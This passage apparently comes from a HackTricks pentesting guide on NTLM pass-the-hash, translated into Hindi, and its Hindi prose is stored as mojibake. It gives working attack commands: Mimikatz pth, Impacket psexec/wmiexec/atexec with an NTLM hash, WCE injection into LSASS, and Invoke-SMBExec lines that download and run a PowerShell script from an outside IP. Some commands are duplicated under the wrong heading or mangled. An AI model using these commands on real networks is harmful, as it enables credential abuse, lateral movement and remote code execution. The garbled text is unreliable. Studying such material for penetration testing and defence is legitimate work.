рдХреНрд▓рд╛рдЗрдВрдЯ рдЪреИрд▓реЗрдВрдЬ рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛**ред рдХреБрд▓: 24 Bред

**рджреВрд╕рд░реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** **рдХрдИ рдорд╛рдиреЛрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ (рдПрдХ рдирдпрд╛ рдХреНрд▓рд╛рдЗрдВрдЯ рдЪреИрд▓реЗрдВрдЬ, рдПрдХ **рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк** **рд░рд┐рдкреНрд▓реЗ рдЕрдЯреИрдХреНрд╕** рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП...)

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ **pcap рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕рдлрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**, рддреЛ рдЖрдк рдЗрд╕ рдЧрд╛рдЗрдб рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ рдбреЛрдореЗрди, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо, рдЪреИрд▓реЗрдВрдЬ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдкреАрдбрд╝рд┐рдд рдХрд╛ рд╣реИрд╢ рд╣реЛ**, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрд╕рдХреА рдирдХрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдкрдХреЛ рдПрдХ **рдЯреВрд▓** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ **NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдЙрд╕ рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рджрд░реНрд╢рди рдХрд░реЗрдЧрд╛**, **рдпрд╛** рдЖрдк рдПрдХ рдирдпрд╛ **sessionlogon** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕ **рд╣реИрд╢** рдХреЛ **LSASS** рдХреЗ рдЕрдВрджрд░ **рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддрд╛рдХрд┐ рдЬрдм рднреА рдХреЛрдИ **NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рд╡рд╣ **рд╣реИрд╢ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред** рдЖрдЦрд┐рд░реА рд╡рд┐рдХрд▓реНрдк рд╡рд╣ рд╣реИ рдЬреЛ mimikatz рдХрд░рддрд╛ рд╣реИред

**рдХреГрдкрдпрд╛, рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдЖрдк Pass-the-Hash рд╣рдорд▓реЗ рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

### **Mimikatz**

**рдЗрд╕реЗ рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
```markdown
рдпрд╣ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╢реБрд░реВ рдХрд░реЗрдЧрд╛ рдЬреЛ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдЕрдВрддрд░реНрдЧрдд рдЖрддреА рд╣реИ рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ mimikatz рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди LSASS рдореЗрдВ рдЗрдВрдЯрд░рдирд▓реА рд╕рд╣реЗрдЬреЗ рдЧрдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╡реЗ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ mimikatz рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЗ рдЕрдВрджрд░ рд╣реЛрддреЗ рд╣реИрдВред рдлрд┐рд░, рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ рдЖрдк рд╡рд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реЛрдВ (runas /netonly рдЯреНрд░рд┐рдХ рдХреЗ рд╕рдорд╛рди рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рдкреНрд▓реЗрди-рдЯреЗрдХреНрд╕реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ)ред

### рд▓рд┐рдирдХреНрд╕ рд╕реЗ Pass-the-Hash

рдЖрдк рд▓рд┐рдирдХреНрд╕ рд╕реЗ Pass-the-Hash рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Windows рдорд╢реАрдиреЛрдВ рдореЗрдВ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
[**рдпрд╣рд╛рдБ рдЬрд╛рдиреЗрдВ рдХрд┐ рдпрд╣ рдХреИрд╕реЗ рдХрд░реЗрдВред**](../../windows/ntlm/broken-reference/)

### Impacket Windows рд╕рдВрдХрд▓рд┐рдд рдЙрдкрдХрд░рдг

рдЖрдк[ рдпрд╣рд╛рдБ рд╕реЗ Windows рдХреЗ рд▓рд┐рдП impacket рдмрд╛рдЗрдирд░реАрдЬрд╝ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)ред

* **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдкрдХреЛ рдПрдХ рдХрдорд╛рдВрдб рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, cmd.exe рдФрд░ powershell.exe рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реИрдВ)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Impacket рдмрд╛рдЗрдирд░реАрдЬрд╝ рдХреЗ рдХрдИ рдФрд░ рднреА рд╣реИрдВ...

### Invoke-TheHash

рдЖрдк рдпрд╣рд╛рдБ рд╕реЗ powershell рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum рдХрд╛ рдкреНрд░рдпреЛрдЧ
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

рдпрд╣ рдлрд╝рдВрдХреНрд╢рди **рд╕рднреА рдЕрдиреНрдп рдХрд╛ рдорд┐рд╢реНрд░рдг** рд╣реИред рдЖрдк **рдХрдИ рд╣реЛрд╕реНрдЯреНрд╕** рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдХреБрдЫ рдХреЛ **рдмрд╛рд╣рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЬреЛ **рд╡рд┐рдХрд▓реНрдк** рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЙрд╕реЗ **рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВ** (_SMBExec, WMIExec, SMBClient, SMBEnum_)ред рдпрджрд┐ рдЖрдк **SMBExec** рдФрд░ **WMIExec** рдореЗрдВ рд╕реЗ **рдХреЛрдИ рднреА** рдЪреБрдирддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдХреЛрдИ _**Command**_ рдкреИрд░рд╛рдореАрдЯрд░ рдирд╣реАрдВ рджреЗрддреЗ рд╣реИрдВ рддреЛ рдпрд╣ рдХреЗрд╡рд▓ **рдЬрд╛рдВрдЪ** рдХрд░реЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдВ** рд╣реИрдВред
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**рдЗрд╕реЗ рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**

рдпрд╣ рдЯреВрд▓ mimikatz рдХреЗ рд╕рдорд╛рди рдХрд╛рд░реНрдп рдХрд░реЗрдЧрд╛ (LSASS рдореЗрдореЛрд░реА рдореЗрдВ рд╕рдВрд╢реЛрдзрди рдХрд░реЗрдЧрд╛)ред
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### рдпреВрдЬрд░рдиреЗрдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рдореИрдиреБрдЕрд▓ рд╡рд┐рдВрдбреЛрдЬ рд░рд┐рдореЛрдЯ рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## рд╡рд┐рдВрдбреЛрдЬ рд╣реЛрд╕реНрдЯ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд┐рдХрд╛рд▓рдирд╛

**рд╡рд┐рдВрдбреЛрдЬ рд╣реЛрд╕реНрдЯ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЗрд╕ рдкреЗрдЬ рдХреЛ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рд┐рдПред**

## NTLM рд░рд┐рд▓реЗ рдФрд░ рд░рд┐рд╕реНрдкреЙрдиреНрдбрд░

**рдЗрди рд╣рдорд▓реЛрдВ рдХреЛ рдХреИрд╕реЗ рдХрд░реЗрдВ, рдЗрд╕ рдкрд░ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рдЧрд╛рдЗрдб рдХреЗ рд▓рд┐рдП рдпрд╣рд╛рдБ рдкрдврд╝реЗрдВ:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## рдиреЗрдЯрд╡рд░реНрдХ рдХреИрдкреНрдЪрд░ рд╕реЗ NTLM рдЪреИрд▓реЗрдВрдЬреЗрд╕ рдкрд╛рд░реНрд╕ рдХрд░рдирд╛

**рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рддрдХ рдкрд╣реБрдБрдЪ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, hacktricks repo** рдФрд░ **hacktricks-cloud repo** рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
